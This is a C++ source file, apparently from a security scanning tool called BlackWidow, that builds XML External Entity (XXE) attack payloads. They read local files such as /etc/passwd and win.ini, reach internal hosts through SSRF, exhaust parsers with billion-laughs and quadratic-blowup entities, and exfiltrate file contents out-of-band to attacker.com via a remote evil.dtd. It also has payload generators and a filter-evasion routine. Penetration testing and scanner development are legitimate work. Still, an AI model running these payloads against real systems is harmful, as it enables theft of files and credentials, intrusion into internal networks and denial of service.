/**
 * XxePayloads.cpp
 * Implementación de payloads para detección y explotación de vulnerabilidades XXE
 */

#include "XxePayloads.h"
#include <vector>
#include <string>
#include <sstream>

namespace BlackWidow {
namespace Security {
namespace Payloads {

std::vector<std::string> XxePayloads::getBasicPayloads() {
    return {
        // Payload básico para probar XXE
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
        "<!DOCTYPE foo [\n"
        "<!ELEMENT foo ANY >\n"
        "<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n"
        "<foo>&xxe;</foo>",
        
        // Payload para Windows
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
        "<!DOCTYPE foo [\n"
        "<!ELEMENT foo ANY >\n"
        "<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\" >]>\n"
        "<foo>&xxe;</foo>",
        
        // Payload básico para SSRF
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
        "<!DOCTYPE foo [\n"
        "<!ELEMENT foo ANY >\n"
        "<!ENTITY xxe SYSTEM \"http://internal-server/\" >]>\n"
        "<foo>&xxe;</foo>",
        
        // Payload con entidad parametrizada
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
        "<!DOCTYPE foo [\n"
        "<!ELEMENT foo ANY >\n"
        "<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">\n"
        "<!ENTITY param1 \"value1\">\n"
        "%xxe;\n"
        "]>\n"
        "<foo>&param1;</foo>"
    };
}

std::vector<std::string> XxePayloads::getAdvancedPayloads() {
    return {
        // XXE con exfiltración de datos
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
        "<!DOCTYPE foo [\n"
        "<!ELEMENT foo ANY >\n"
        "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n"
        "<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">\n"
        "%dtd;\n"
        "]>\n"
        "<foo>&send;</foo>",
        
        // Contenido del evil.dtd
        "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>\">\n"
        "%all;",
        
        // XXE con blind OOB
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
        "<!DOCTYPE foo [\n"
        "<!ELEMENT foo ANY >\n"
        "<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">\n"
        "%xxe;\n"
        "]>\n"
        "<foo>Blind XXE</foo>",
        
        // XXE con error para exfiltración
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
        "<!DOCTYPE foo [\n"
        "<!ELEMENT foo ANY >\n"
        "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n"
        "<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">\n"
        "%eval;\n"
        "%error;\n"
        "]>\n"
        "<foo>Error-based XXE</foo>",
        
        // XXE con DoS (billion laughs)
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
        "<!DOCTYPE lolz [\n"
        "<!ENTITY lol \"lol\">\n"
        "<!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n"
        "<!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n"
        "<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n"
        "<!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n"
        "<!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n"
        "<!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n"
        "<!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n"
        "<!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n"
        "<!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n"
        "]>\n"
        "<lolz>&lol9;</lolz>"
    };
}

std::vector<std::string> XxePayloads::getAttackSpecificPayloads(XxeAttackType attackType) {
    switch(attackType) {
        case XxeAttackType::FILE_READ:
            return {
                // Lectura de archivos en Linux
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
                "<!DOCTYPE foo [\n"
                "<!ELEMENT foo ANY >\n"
                "<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n"
                "<foo>&xxe;</foo>",
                
                // Lectura de archivos en Windows
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
                "<!DOCTYPE foo [\n"
                "<!ELEMENT foo ANY >\n"
                "<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\" >]>\n"
                "<foo>&xxe;</foo>",
                
                // Lectura de archivos con PHP filter
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
                "<!DOCTYPE foo [\n"
                "<!ELEMENT foo ANY >\n"
                "<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\" >]>\n"
                "<foo>&xxe;</foo>"
            };
            
        case XxeAttackType::SSRF:
            return {
                // SSRF básico
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
                "<!DOCTYPE foo [\n"
                "<!ELEMENT foo ANY >\n"
                "<!ENTITY xxe SYSTEM \"http://internal-server/\" >]>\n"
                "<foo>&xxe;</foo>",
                
                // SSRF a localhost
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
                "<!DOCTYPE foo [\n"
                "<!ELEMENT foo ANY >\n"
                "<!ENTITY xxe SYSTEM \"http://localhost:8080/\" >]>\n"
                "<foo>&xxe;</foo>",
                
                // SSRF con IP interna
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
                "<!DOCTYPE foo [\n"
                "<!ELEMENT foo ANY >\n"
                "<!ENTITY xxe SYSTEM \"http://192.168.1.1/\" >]>\n"
                "<foo>&xxe;</foo>"
            };
            
        case XxeAttackType::DENIAL_OF_SERVICE:
            return {
                // Billion laughs attack
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
                "<!DOCTYPE lolz [\n"
                "<!ENTITY lol \"lol\">\n"
                "<!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n"
                "<!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n"
                "<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n"
                "<!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n"
                "<!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n"
                "<!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n"
                "<!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n"
                "<!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n"
                "<!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n"
                "]>\n"
                "<lolz>&lol9;</lolz>",
                
                // Quadratic Blowup Attack
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
                "<!DOCTYPE kaboom [\n"
                "<!ENTITY a \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\">\n"
                "]>\n"
                "<kaboom>\n"
                "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\n"
                "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\n"
                "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\n"
                "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\n"
                "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\n"
                "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\n"
                "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\n"
                "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\n"
                "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\n"
                "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\n"
                "</kaboom>",
                
                // Archivo infinito
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
                "<!DOCTYPE foo [\n"
                "<!ELEMENT foo ANY >\n"
                "<!ENTITY xxe SYSTEM \"file:///dev/random\" >]>\n"
                "<foo>&xxe;</foo>"
            };
            
        case XxeAttackType::ERROR_BASED:
            return {
                // Error-based XXE para exfiltración
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
                "<!DOCTYPE foo [\n"
                "<!ELEMENT foo ANY >\n"
                "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n"
                "<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">\n"
                "%eval;\n"
                "%error;\n"
                "]>\n"
                "<foo>Error-based XXE</foo>",
                
                // Error-based XXE con DTD remoto
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
                "<!DOCTYPE foo [\n"
                "<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">\n"
                "%xxe;\n"
                "]>\n"
                "<foo>Error-based XXE</foo>"
                // evil.dtd contendría:
                // <!ENTITY % file SYSTEM "file:///etc/passwd">
                // <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
                // %eval;
                // %error;
            };
            
        case XxeAttackType::OUT_OF_BAND:
            return {
                // XXE OOB con DTD remoto
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
                "<!DOCTYPE foo [\n"
                "<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">\n"
                "%xxe;\n"
                "]>\n"
                "<foo>OOB XXE</foo>",
                
                // XXE OOB con exfiltración de datos
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
                "<!DOCTYPE foo [\n"
                "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n"
                "<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">\n"
                "%dtd;\n"
                "]>\n"
                "<foo>&send;</foo>"
                // evil.dtd contendría:
                // <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
                // %all;
            };
            
        default:
            return getBasicPayloads();
    }
}

std::string XxePayloads::generateFileReadPayload(const std::string& filePath) {
    std::ostringstream payload;
    
    payload << "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
            << "<!DOCTYPE foo [\n"
            << "<!ELEMENT foo ANY >\n"
            << "<!ENTITY xxe SYSTEM \"file://" << filePath << "\" >]>\n"
            << "<foo>&xxe;</foo>";
    
    return payload.str();
}

std::string XxePayloads::generateSsrfPayload(const std::string& url) {
    std::ostringstream payload;
    
    payload << "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
            << "<!DOCTYPE foo [\n"
            << "<!ELEMENT foo ANY >\n"
            << "<!ENTITY xxe SYSTEM \"" << url << "\" >]>\n"
            << "<foo>&xxe;</foo>";
    
    return payload.str();
}

std::string XxePayloads::generateOobExfiltrationPayload(
    const std::string& url,
    const std::string& data
) {
    std::ostringstream payload;
    
    if (data.empty()) {
        // Si no hay datos específicos, intentamos leer /etc/passwd
        payload << "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
                << "<!DOCTYPE foo [\n"
                << "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n"
                << "<!ENTITY % dtd SYSTEM \"" << url << "/evil.dtd\">\n"
                << "%dtd;\n"
                << "]>\n"
                << "<foo>&send;</foo>";
    } else {
        // Si hay datos específicos, los enviamos directamente
        payload << "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
                << "<!DOCTYPE foo [\n"
                << "<!ELEMENT foo ANY >\n"
                << "<!ENTITY xxe SYSTEM \"" << url << "/?data=" << data << "\" >]>\n"
                << "<foo>&xxe;</foo>";
    }
    
    return payload.str();
}

std::string XxePayloads::applyEvasionTechniques(const std::string& payload) {
    // Implementamos algunas técnicas de evasión comunes
    // 1. Usar UTF-16 encoding
    if (payload.find("encoding=\"ISO-8859-1\"") != std::string::npos) {
        std::string utf16Payload = payload;
        size_t pos = utf16Payload.find("encoding=\"ISO-8859-1\"");
        utf16Payload.replace(pos, 23, "encoding=\"UTF-16\"");
        return utf16Payload;
    }
    
    // 2. Usar entidades parametrizadas
    if (payload.find("<!ENTITY xxe SYSTEM") != std::string::npos) {
        std::string paramPayload = payload;
        size_t pos = paramPayload.find("<!ENTITY xxe SYSTEM");
        size_t endPos = paramPayload.find(">", pos);
        std::string entityDef = paramPayload.substr(pos, endPos - pos + 1);
        
        // Reemplazar con entidad parametrizada
        std::string newEntityDef = "<!ENTITY % xxe SYSTEM" + entityDef.substr(17);
        newEntityDef += "\n<!ENTITY xxe \"%xxe;\">";
        
        paramPayload.replace(pos, endPos - pos + 1, newEntityDef);
        return paramPayload;
    }
    
    // 3. Usar comentarios XML para ofuscar
    std::string commentPayload = payload;
    size_t docTypePos = commentPayload.find("<!DOCTYPE");
    if (docTypePos != std::string::npos) {
        commentPayload.insert(docTypePos, "<!-- comment -->\n");
    }
    
    size_t entityPos = commentPayload.find("<!ENTITY");
    while (entityPos != std::string::npos) {
        commentPayload.insert(entityPos, "<!-- -->\n");
        entityPos = commentPayload.find("<!ENTITY", entityPos + 12);
    }
    
    return commentPayload;
}

} // namespace Payloads
} // namespace Security
} // namespace BlackWidow